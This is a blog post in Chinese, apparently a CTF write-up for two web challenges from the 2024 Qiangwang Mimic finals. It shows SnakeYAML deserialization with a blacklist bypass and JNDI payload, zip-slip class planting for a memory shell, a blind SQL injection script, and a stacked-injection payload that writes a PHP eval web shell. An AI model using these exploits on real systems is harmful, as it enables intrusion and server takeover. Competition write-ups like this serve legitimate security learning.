@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            2024 强网拟态决赛web 部分wp
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="turn"><a href="#turn" class="headerlink" title="turn"></a>turn</h1><h2 id="出网打法"><a href="#出网打法" class="headerlink" title="出网打法"></a>出网打法</h2><p>有个文件上传接口，可以在线解压。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128215914922.png" alt="image-20241128215914922.png"></p>
+<p>yaml反序列化，固定反序列化&#x2F;opt&#x2F;resources下的文件。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128215929153.png" alt="image-20241128215929153.png"></p>
+<p>黑名单：</p>
+<blockquote>
+<p>{“ScriptEngineManager”, “URLClassLoader”, “!!”, “ClassLoader”, “AnnotationConfigApplicationContext”, “FileSystemXmlApplicationContext”, “GenericXmlApplicationContext”, “GenericGroovyApplicationContext”, “GroovyScriptEngine”, “GroovyClassLoader”, “GroovyShell”, “ScriptEngine”, “ScriptEngineFactory”, “XmlWebApplicationContext”, “ClassPathXmlApplicationContext”, “MarshalOutputStream”, “InflaterOutputStream”, “FileOutputStream”};</p>
+</blockquote>
+<p>大致看一下，可以利用的点：</p>
+<ol>
+<li><p>&#x2F;upload处，可以目录穿越，可以传文件到任意为止，但是后缀固定是zip。yaml反序列化不看文件后缀名。</p>
+</li>
+<li><p>&#x2F;unzip这里，注意看entry.getName()，没有做检查，也可以穿越，这个比较牛逼，不限后缀，且父目录不存在则会创建。怎么利用呢？像这样：</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&#x27;example.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zipf:</span><br><span class="line">	zipf.write(<span class="string">&#x27;your_file&#x27;</span>,<span class="string">&#x27;../your_file.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样的entry.getName()就是带..&#x2F;的。</p>
+<p>直接使用unzip命令会跳过目录穿越：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220132928.png" alt="image-20241128220132928.png"></p>
+<p>做法就是，绕过黑名单，然后直接打jndi。这种绕过写法，我也是第一次见。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%TAG !  tag:yaml.org,2002:</span><br><span class="line">---</span><br><span class="line">!com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">dataSourceName: &quot;ldap://127.0.0.1&quot;</span><br><span class="line">autoCommit: true</span><br></pre></td></tr></table></figure>
+
+<h2 id="不出网打法"><a href="#不出网打法" class="headerlink" title="不出网打法"></a>不出网打法</h2><p>好了，现在这题假如不出网怎么打？</p>
+<p>现场打的时候，直接打jndi不通外网的vps，所以花了好几个小时本地调试，排查问题，然后摸索不出网的打法。有点头绪之后，发现竟然通接入的vpn的本机ip，就直接打jndi。</p>
+<p>结束之后，继续之前的不出网打法思路，最终摸索出来了。</p>
+<p>思路：由于已经能达成任意文件写，所以想写一个恶意类，到jdk的类加载路径，然后使用yaml去触发反序列化。</p>
+<p>先确定jdk路径：&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre&#x2F;</p>
+<p>怎么确定的？本机的jdk8路径是这个，然后借助&#x2F;upload的目录穿越，穿越到这里，如果这个目录存在，则正常上传文件，否则会提示报错信息。</p>
+<p>然后借助&#x2F;upzip，写一个类，写到&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre&#x2F;classes下。这个目录下的类文件默认都会查找。</p>
+<p>恶意类：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">UnkExp</span> &#123;</span><br><span class="line"></span><br><span class="line">    public UnkExp()&#123;</span><br><span class="line">        //    Evil operation</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>yaml</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%TAG !  tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!example.UnkExp</span><br></pre></td></tr></table></figure>
+
+<p>我以为这样会自动调用无参构造。</p>
+<p>然后报错：</p>
+<blockquote>
+<p>Caused by: org.yaml.snakeyaml.error.YAMLException: No single argument constructor found for class example.UnkExp : null</p>
+</blockquote>
+<p>虽然不知道为什么，那就再加上一个单参构造，然后继续报错：</p>
+<blockquote>
+<p>Caused by: org.yaml.snakeyaml.error.YAMLException: Unsupported class: class java.lang.Object</p>
+</blockquote>
+<p>为什么呢？比赛时就卡在这个位置。</p>
+<p>睡一觉之后继续思考，会不会是因为没有字段？改成这样：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%TAG !  tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!example.UnkExp</span><br><span class="line">autoCommit: true</span><br></pre></td></tr></table></figure>
+
+<p>类写成这样</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">UnkExp</span> &#123;</span><br><span class="line"></span><br><span class="line">    public UnkExp()&#123;&#125;</span><br><span class="line">    public UnkExp(Object o)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public void setAutoCommit(boolean o)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不报错了，可以成功进setter。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220420812.png" alt="image-20241128220420812.png"></p>
+<p>后续就是打内存马。</p>
+<p>总结一下，问题还是自己想当然以为会调构造器的，省了字段的这一步。</p>
+<p>问题又来了，为什么有字段可以，没字段不行呢？</p>
+<p>根据异常去找一下调用栈，看看哪里不一样。</p>
+<p>成功触发setter时的调用栈：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:<span class="number">290</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.construct(Constructor.java:<span class="number">171</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:<span class="number">331</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:<span class="number">229</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:<span class="number">219</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:<span class="number">173</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:<span class="number">157</span>)</span><br><span class="line">at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:<span class="number">490</span>)</span><br><span class="line">at org.yaml.snakeyaml.Yaml.loadAs(Yaml.java:<span class="number">484</span>)</span><br></pre></td></tr></table></figure>
+
+<p>报错<code>Unsupported class: class java.lang.Object</code>时的调用栈</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructScalar.constructStandardJavaInstance(Constructor.java:<span class="number">513</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructScalar.construct(Constructor.java:<span class="number">396</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:<span class="number">331</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:<span class="number">335</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:<span class="number">229</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:<span class="number">219</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:<span class="number">173</span>)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:<span class="number">157</span>)</span><br><span class="line">at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:<span class="number">490</span>)</span><br><span class="line">at org.yaml.snakeyaml.Yaml.loadAs(Yaml.java:<span class="number">484</span>)</span><br></pre></td></tr></table></figure>
+
+<p>差别在，一个是<code>Constructor$ConstructScalar.construct</code>，一个是<code>Constructor$ConstructMapping.construct</code></p>
+<p>断点打在：<code>Constructor$ConstructYamlObject.construct</code></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220715803.png" alt="image-20241128220715803.png"></p>
+<p>发现解析出来的两种Node不一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;org.yaml.snakeyaml.nodes.ScalarNode (tag=tag:``yaml.org``,2002:example.UnkExp, value=)&gt;</span><br><span class="line">&lt;org.yaml.snakeyaml.nodes.MappingNode (tag=tag:``yaml.org``,2002:com.sun.rowset.JdbcRowSetImpl, values=...</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220859599.png" alt="image-20241128220859599.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220908608.png" alt="image-20241128220908608.png"></p>
+<p>所以就是有字段值被当做Map，没有字段被当做标量了。</p>
+<h1 id="sqlmagic"><a href="#sqlmagic" class="headerlink" title="sqlmagic"></a>sqlmagic</h1><p>sql注入。</p>
+<p>单双引号井号还有 – 都被waf拦截</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220937732.png" alt="image-20241128220937732.png"></p>
+<p>如此闭合：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select x <span class="keyword">from</span> x where username=<span class="string">&quot;$username&quot;</span> <span class="keyword">and</span> password=<span class="string">&quot;$password&quot;</span></span><br><span class="line">select x <span class="keyword">from</span> x where username=<span class="string">&quot;1\&quot; and password=&quot;</span>=<span class="number">0</span>;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">import</span> requests,time,string</span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BasicType</span>:</span><br><span class="line">    value:<span class="built_in">str</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.value</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boolean</span>(<span class="title class_ inherited__">BasicType</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ascii</span>(<span class="title class_ inherited__">BasicType</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">equals</span>(<span class="params">self,another:<span class="string">&#x27;Ascii&#x27;</span></span>):</span><br><span class="line">        r2 = Boolean(<span class="string">f&#x27;((<span class="subst">&#123;self.value&#125;</span>)=(<span class="subst">&#123;another.value&#125;</span>))&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> r2</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">greater</span>(<span class="params">self,another:<span class="string">&#x27;Ascii&#x27;</span></span>):</span><br><span class="line">        r = Boolean(<span class="string">f&quot;(leAst(<span class="subst">&#123;self.value&#125;</span>,<span class="subst">&#123;another.value&#125;</span>)in(<span class="subst">&#123;another.value&#125;</span>))&quot;</span>) </span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span>(<span class="title class_ inherited__">BasicType</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">asciiAt</span>(<span class="params">self,index:<span class="built_in">int</span></span>) -&gt; Ascii:</span><br><span class="line">        s2 = Ascii(<span class="string">f&#x27;(Ascii(right(left(<span class="subst">&#123;self.value&#125;</span>,<span class="subst">&#123;index&#125;</span>),1)))&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s2</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">equals</span>(<span class="params">self,another:<span class="string">&#x27;String&#x27;</span></span>) -&gt; Boolean:</span><br><span class="line">        <span class="keyword">return</span> Boolean(<span class="string">f&#x27;((<span class="subst">&#123;self.value&#125;</span>)in(<span class="subst">&#123;another.value&#125;</span>))&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStringValueByAscii</span>(<span class="params">target:String,<span class="built_in">len</span>:<span class="built_in">int</span>=<span class="number">999</span></span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>):</span><br><span class="line">        stop = <span class="literal">True</span> <span class="comment"># 此种自动停止的方式,当asciiAt方法使用left+right截取字符串时无效</span></span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> (right &gt; left):</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> judgeBoolean(target.asciiAt(i).equals(Ascii(mid))):</span><br><span class="line">                result += <span class="built_in">chr</span>(mid)</span><br><span class="line">                <span class="built_in">print</span>(i,result)</span><br><span class="line">                stop = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> judgeBoolean(target.asciiAt(i).greater(Ascii(mid))):</span><br><span class="line">                left = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">        <span class="keyword">if</span> stop:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition</span>(<span class="params">res</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judgeBoolean</span>(<span class="params">target:Boolean</span>):</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;http://172.25.29.19/index.php&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">f&quot;114\\&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">f&#x27;=if(<span class="subst">&#123;target&#125;</span>,0,1);&#x27;</span>&#125;</span><br><span class="line">    res = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">return</span> condition(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    getStringValueByAscii(String(<span class="string">&#x27;password&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>跑出来密码，但是没啥用。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128221002110.png" alt="image-20241128221002110.png"></p>
+<p>读变量</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128221009825.png" alt="image-20241128221009825.png"></p>
+<p>思路明显了，估计是要写shell。</p>
+<p>先读index.php看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getStringValueByAscii(String(&#x27;hex(load_file(char(47,118,97,114,47,119,119,119,47,104,116,109,108,47,105,110,100,101,120,46,112,104,112)))&#x27;))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$con = new PDO(<span class="string">&quot;mysql:host=localhost;port=3306;dbname=ctf&quot;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&quot;username&quot;</span>]) &amp;&amp; isset($_POST[<span class="string">&quot;password&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $username=$_POST[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    $password=$_POST[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[#&#x27;\&quot;*\/&lt;&gt;-]|select|union|case|between|like|regexp|set|do|0x|0b|\s|\w\xa0+\(/is&quot;</span>, $username) || preg_match(<span class="string">&quot;/[#&#x27;\&quot;*\/&lt;&gt;-]|select|union|case|between|like|regexp|set|do|0x|0b|\s|\w\xa0+\(/is&quot;</span>, $password))&#123;</span><br><span class="line">        die(<span class="string">&quot;waf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">&quot;SELECT username FROM user WHERE username = \&quot;$username\&quot; and password = \&quot;$password\&quot;&quot;</span>; </span><br><span class="line">    $ret = $con-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span> (count($ret-&gt;fetchAll())&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;Wrong username or password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./all.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
+
+<p>存在堆叠注入，我还是想当然以为不可以，甚至也没有去测，导致浪费了3 4小时。</p>
+<p>过程中尝试各种写shell的绕过，顺便补充了不懂的。</p>
+<ol>
+<li>没有union 和 select，但是有引号时候，可以这样：into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’ fields terminated by ‘&lt;?php assert($_POST[“cmd”]);?&gt;’</li>
+<li>outfile和dumpfile后面，必须接字符串的常量，函数变换比如char还有反引号都不行。</li>
+</ol>
+<p>然后是堆叠，没有set，怎么办呢？测试如下：prepare from 这个语句后边，mariadb可以接字符串表达式，但是mysql必须接字符串常量或者@变量。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128221113043.png" alt="image-20241128221113043.png"></p>
+<p>用这个：:&#x3D;定义变量语法可以在where字句用</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=123&amp;password=and%a0@c2:=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,49,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,103,46,112,104,112,39,59);prepare%a0p%a0from%a0@c2;execute%a0p;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#turn"><span class="toc-text">turn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E6%89%93%E6%B3%95"><span class="toc-text">出网打法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%89%93%E6%B3%95"><span class="toc-text">不出网打法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmagic"><span class="toc-text">sqlmagic</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
